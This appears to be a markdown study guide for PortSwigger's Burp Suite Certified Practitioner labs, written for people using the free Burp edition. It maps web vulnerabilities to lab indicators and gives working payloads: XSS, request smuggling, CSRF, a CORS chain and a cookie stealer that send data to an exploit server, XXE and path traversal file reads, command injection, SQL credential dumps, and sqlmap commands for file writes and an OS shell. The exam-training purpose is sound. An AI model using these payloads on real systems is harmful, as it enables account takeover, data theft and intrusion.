# Methodology for BSCP Web App Pentesting Without Pro
For those who can't afford burp pro or cheapskates thogh you can't take an actual exam without pro. Note that this NOT a general pentesting methodology. For example in this workflow SQLi only appears in the stage 2 `get admin` but in a real environment it can be used for getting a normal user account.

---

[URL Fuzzing](#FUZZ)  
[XSS](#XSS)  
[Cache Poisoning](#Cache-poisoning)  
[HTTP Host Header Attacks](#HTTP-Host-header-attacks)  
[HTTP Request Smuggling](#Http-request-smuggling)  
[Authentication Bypass](#Authentication-Bypass)  
[Bruteforcing](#Brute-forcing)

[CSRF](#CSRF)  
[SQLi](#SQLi)  
[CORS](#CORS)  
[JWT](#JWT)  
[Broken Access Control](#Broken-access-control)  
[OAuth](#OAuth)  

[OS Command Injections](#OS-command-injections)  
[XXE](#XXE)  
[LFI](#LFI)  
[File Uploading](#File-uploading)  
[SSRF](#SSRF)  
[SSTI](#SSTI)  
[Insecure Deserialization](#Insecure_Deserialization)  

[Common Payloads](#Common-Payloads-and-Commands)  
[Tools](#Tools)  
[Wordlists](#Wordlists)  

---

## Flow

*Indicators* provide hints on how to **identify** vulnerabilities.

### Recon

#### List functionalities

Manually crawl the website with burp on.

##### login form, authentication  
    OAuth
    Password reset
    Host header
  
##### search, advanced search  
    XSS
    SQLi

##### blog posts  
    LFI
    File upload
    XSS
  
##### stock  
    XSS
    SQLi
    XXE
  
##### live chat  
    Websocket XSS

##### category filter  
    SQLi
  
##### email update  
    CSRF

##### API calls  
    IDOR
    GraphQL

##### feedback submission  
    OS command injections

##### No visible functionalities  
    cookies
    insecure deserialization
    cache poisoning
    


#### Fuzz

With burp pro you can right click a domain in the site map > Engagement tools > Disocover content, but it's not available in the community edition. However, you can use ffuf instead.

URL fuzz:
```bash
ffuf -u https://ID.web-security-academy.net/FUZZ -w /path/to/SecLists/Web-Content/common.txt -s -c
```

To find [SecLists](https://github.com/danielmiessler/SecLists) in your system:
```bash
find / -iname "SecLists" 2>/dev/null
```

Other wordlists:  
[burp-labs-wordlist.txt](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/wordlists/burp-labs-wordlist.txt)


#### View source

Look for indicators and hints.

dev comments `<!--`  

Indicators:
```txt
ng-app
sanitizeKey()
.js files
<script> tags
type=hidden
&path=
```

DOM XSS sources and sinks:
```txt
---sources---
window.location
document.cookie
document.domain
WebSocket()
postMessage()
FileReader.readAsText()
sessionStorage.setItem()
location.search
URLSearchParams
---sinks---
document.write()
eval()
element.src
setRequestHeader()
ExecuteSql()
document.evaluate()
JSON.parse
replace()
innerHTML
addEventListener()
```
---

### Access any user account

#### Version Control

Could be found with [fuzzing](#Fuzz)

Download .git:
```bash
wget -r https://ID.web-security-academy.net/.git/
```

Find contents in past commits:
```bash
git diff
git log -- FILENAME
git show COMMIT_ID:FILENAME
```

[Lab: Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)

#### XSS

Fuzzer:
```js
<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(55)-"fuzzer
```

##### Bypassing restrictions on tags and attributes

Use [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) with Intruder.

Fuzz tags:
```html
GET /?search=<§§> HTTP/2
```
Fuzz events:
```html
GET /?search=<body%20§§=print()> HTTP/2
```

[Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

Working payload for this lab:
```html
<iframe src="https://0a94001004ef162c802adf6300cd000b.web-security-academy.net/?search=%3Cbody%20onresize%3Dprint()%3E" onload=this.style.width='500px'>
```

##### Reflected DOM

Indicator:  
In `/resources/js/searchResults.js`, `eval()` is used.

Working payload:
```js
\"-alert(1)}//
```

[Lab: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)

##### Angular JS

indicators:
```html
ng-app
angular_VER.js
```

1.6+ payload:
```js
{{constructor.constructor('console.log(window.origin)')()}}
```

##### WebSocket

Indicators:
Live systems (e.g. live chat)  
`Upgrade: websocket` header  
`Sec-Websocket-Version`  header
`Sec-Websocket-Key` header  

Bypass technique:
```js
<sCrIpt>alert(window.origin)</ScRipt>
```

You can spoof your IP with `X-Forwarded-For` header and bypass the ban.

[Lab: Manipulating the WebSocket handshake to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)

#### Cache poisoning

##### Unkeyed header

Indicator:
A js script that is fetched from a URL like this:
<script type="text/javascript" src="https://ID.web-security-academy.net/resources/js/tracking.js"></script>

Find unkeyed headers using [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) extension. In this case, sending a request with `X-Forwarded-Host: exploit-ID.exploit-server.net` header works and you can host a [cookie stealer](#Cookie Stealer) script named `/resources/js/tracking.js`.

[Lab: Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)

#### HTTP Host header attacks

##### Authentication Bypass

Change the Host header to `localhost` bypasses the authentication mechanism to the admin panel.

[Lab: Host header authentication bypass](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass)

#### Http request smuggling

Use [HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) Extension.

##### Chained with reflected XSS

Indicator:  
A comment form contains `User-Agent` header as a hidden input.

Timining technique for checking CL.TE:
```html
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4
1
A
X
```

For CL.TE you don't have to use HTTP request smuggler extension but clicking the gear icon and turning on `update content length` is enough.

working payload:
```html
POST / HTTP/1.1
Host: 0a0d00f5041e114f80bf948800f20081.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Transfer-Encoding: chunked
0

GET /post?postId=5
HTTP/1.1
User-Agent: "/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
x=1
```

[Lab: Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)

#### Authentication Bypass

##### email domain
Indicator: Registration form with a message that implies a specific email domain has access to the admin panel. 

When the server incorrectly handles a long email, you can register an email like example-super-long@subdomain.com.attacker.com. If the attacker.com part gets cut off, your registered email will have the subdomain.com email domain on their end.

[Lab: Inconsistent handling of exceptional input](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)

#### Brute forcing

##### Flawed brute force protection

Indicator:  
Rate limit is in place but a successful login resets it.

Create a custom wordlist:
```bash
for i in {1..50}; do echo "carlos"; echo "carlos"; echo "wiener"; done > carlos.dict
```

Modify the [password wordlist](https://portswigger.net/web-security/authentication/auth-lab-passwords):
```bash
awk '{print; if (NR % 2 == 0) print "peter";}' pass.dict > pass2.dict
```
(`peter` appears after every second line)

Use Pitchfork attack in Intruder.

[Lab: Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)

#### GraphQL

##### Private GraphQL Posts

When GraphQL is used in a request, Burp automatically detects it. Right click the request > GraphQL > Set introspection query. Send the request. The GraphQL tab appears next to the Hex tab and you can modify the query and variables. Add the `postPassword` field found in a response to the introspection and the response returns the password.

[Lab: Accessing private GraphQL posts](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)

---

### Get admin

#### CSRF

##### Token validation depends on request method

Indicator:  
Deleting the csrf token parameter doesn't return an error when you change POST to GET.

[Lab: CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

Working payload for this lab:
```html
<form action="https://ID.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="beefbowel@example.com">
</form>
<script>document.forms[0].submit();</script>
```

##### Attaching social media profile (OAuth)

Indicator:
The website has `attach a social media profile` feature and has implemented OAuth.  
A GET request to `/auth` doesn't have `state` parameter.

Copy your authorization code for `/auth-linking` before it's used by dropping the requet. Set the payload that contains the code at the exploit server:
```html
<img src="https://0a65004a03c8bdc08047122300410025.web-security-academy.net/oauth-linking?code=YOUR_AUTHORIZATION_CODE">
```
Deliver the payload to the victim and the victim's account will be attached to your account.

[Lab: Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)

#### SQLi

Trigger error messages:  
| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

Time based (MySQL):
```sql
' OR SLEEP(5) -- -
```

Time based (Postgre):
```sql
' OR pg_sleep(5) -- -
```

##### Filter bypass via base64 encoding

```js
eval(atob(BASE64_ENCODED_PAYLOAD))
```

##### Filter bypass via XML encoding

Indicators:
A POST request contains xml data like this: `<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>2</storeId></stockCheck>`  
Changing `ProductId` or `StoreId` to `'` returns an error or a warning message.

Use [Hackverter](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) extension to encode payloads. Check [database enumeration](#Database Enumeration).

[Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

#### CORS

##### Chained with XSS to get subdomain access

Indicators:  
`Access-Control-Allow-Credentials` header is set to true.  
The website uses subdomains like `stock.ID.web-security-academy.net`.  

Set `Origin: https://SUBDOMAIN.ID.web-security-academy.net/`.

[Lab: CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)

Working payload for this lab:
```html
<script>
document.location="http://stock.ID.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload=reqListener;req.open('get','https://ID.web-security-academy.net/accountDetails',true); req.withCredentials=true;req.send();function reqListener(){location='https://EXPLOIT-ID.exploit-server.net/log?key='%2bthis.responseText; };</script>&storeId=1"
</script>
```

#### JWT

Use [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) extension.

##### Unverified Signature

With the JWT Editor extension, requests containing JWT are highlighted in the HTTP history section. Double clicking the JWT shows decoded data in Inspector. Change the username in the sub claim to admin and also change the path to `/administrator`.

[Lab: JWT authentication bypass via unverified signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)

#### Changing password

##### Password Reset Broken Logic

Deleting the value of `temp-forgot-password-token` doesn't cause an error. 

[Lab: Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)

#### Broken access control

##### Missing Function-Level Access Control in Multi-step Process

The admin panel UI restricts access, but the backend doesn't verify privileges before executing the action.

[Lab: Multi-step process with no access control on one step](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step)

#### OAuth

Indicators:  
Lack of `state` parameter in a request to `/auth` that initiates an OAuth flow.  

##### Steal authorization code via redirect_uri

This GET request `/auth?client_id=zy4g0bz0ue0ljgdsusgzm&redirect_uri=https://ID.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email` lacks the `state` parameter. Also you can see the `response_type=code` indicates the grant type is Authorization Code.

You can change the redirect url to the exploit server and get the code in Access Log.

[Lab: OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)

---

### Read secret files

#### OS command injections

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `|`                     | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `||`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |


##### Blind, Output redirection

Indicators:  
The response delays with `;sleep 5;`.  
Writable folders are present.

Redirect the output to a writable file:
```bash
;whoami>/var/www/images/output.txt;
;cat+/etc/hosts>>/var/www/images/output.txt;
```

[Lab: Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

#### XXE

Indicators:  
Request contain xml data  

Hidden attack surface:  
data is placed into a back-end SOAP request -> XInclude attacks  
[SVG file upload](SVG file upload)

Test:
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
If the output replaces `&example;` with Doe, the target is likely vulnerable to XXE.

##### Basic XXE to retrieve files

Inserting `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` and change the value of the parameter to `&xxe;`.

[Lab: Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)

#### LFI

##### File Path Traversal

Indicators:  
`?filename=` parameter appears in a request.

**Obfuscation techniques**:

Mangled path:
```bash
....//....//....//....//etc/passwd
```

URL encode:
```bash
..%252f..%252f..%252fetc/passwd
```
Could be double encoded.

Null byte:
```bash
../../../etc/passwd%00.png
```


[Lab: File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)

#### File uploading

##### SVG file upload
Indicators:  
Image upload accepts svg files

[Lab: Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

working payload:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

#### SSRF

Indicators:
Parameters containing full URLs.  
Parameters containing partial URLs but value submitted is then incorporated server-side into a full URL.  
Referer header visited by analytics software  

##### Filter bypass via open redirection

Indicators:  
`path` parameter contains a partial url: `path=/product?productId=2`  

Feed the `stockApi` parameter with `/product/nextProduct?path=http://192.168.0.12:8080/admin` in this specific lab. 

[Lab: SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)

In a real environment this kind of local IP address wouldn't be supplied so you need to fuzz. Use either burp Intruder of ffuf and change the value of the last octet and the port in for example `http://192.168.0.1:8080/admin`. Also you should try `http://localhost`.

POST request example:
```bash
ffuf -w <(seq 1 10000):FUZZ1 -w <(seq 1 255):FUZZ2  -u "http://target.com" -X POST -d "Api=http://192.168.0.FUZZ1:FUZZ2" -c -s
```

#### SSTI

Test:
```
${{<%[%'"}}%\.
```

Template identification chart by HTB:
![SSTI identification chart](https://academy.hackthebox.com/storage/modules/145/ssti/diagram.png)

##### Unknown language with a documented exploit

Putting `${{<%[%'"}}%\.` into `message` parameter shows an error indicating the use of `handlebars`. Search for the [exploit](https://gist.github.com/vandaimer/b92cdda62cf731c0ca0b05a5acf719b2) using a search engine and modify a payload. URL encode and send it.

[Lab: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

#### Insecure Deserialization

| Object Type     | Header (Hex) | Header (Base64) |
|-----------------|--------------|-----------------|
| Java Serialized | AC ED        | rO              |
| .NET ViewState  | FF 01        | /w              |
| Python Pickle   | 80 04 95     | gASV            |
| PHP Serialized  | 4F 3A        | Tz              |
| Ruby Marshale4.8| 04 08        | BAg=            |


PHP serialized format:
```php
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```

Java uses binary serialization formats. Look for `readObject()` which is used to deserialize data from `InputStream`.

##### Serialization based session mechanism

Indicators:  
base64 encoded session cookie  

An account delete feature specifies the path in a serialized format: `s:19:"users/wiener/avatar";`. Change this to `s:23:"/home/carlos/morale.txt";`. Changing the length (size) is important here.

[PortSwigger Lab: Using application functionality to exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)

## Common Payloads and Commands

### Cookie stealer

```html
<script>
location = "https://ID.web-security-academy.net/?parameter=" + encodeURIComponent("<iframe src='https://exploit-ID.exploit-server.net/?cookies=" + document.cookie + "'>");
</script>
```
### Database Enumeration

Determine the number of columns of the target:
```sql
1 ORDER BY 1-- -
```

or

```sql
1 UNION SELECT NULL,NULL-- -
```

List databases:
```sql
1 UNION select schema_name from INFORMATION_SCHEMA.SCHEMATA-- -
```

List tables:
```sql
1 UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='public'-- -
```

List columns:
```sql
1 UNION select COLUMN_NAME || ':' || TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
```

Get credentials:
```sql
1 UNION select username || ':' || password from users-- -
```

---

## Tools

### SQLMap

Basic usage (including OR tests)
```sql
sqlmap -u 'http://TARGET_IP:TARGET_PORT/example.php?id=*' --level 2 --risk 2 --batch --dump --random-agent
```
`*` specifies the test location.

Adding prefix and suffix:
```sql
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

Database enumeration:
```sql
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

Reading files:
```sql
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

Writing files:
```sql
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
You could use `--os-shell` to open a shell.


## Wordlists

[SecLists](https://github.com/danielmiessler/SecLists)  
[PortSwigger Auth-Lab-Passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)  
[PortSwigger Auth-Lab-Usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)  
[XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)  
[SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)  


## References
[PortSwigger Academy Labs](https://portswigger.net/web-security/all-labs)  
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)  
[Burp Suite Certified Practitioner Exam Study by botesjuan](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md)  
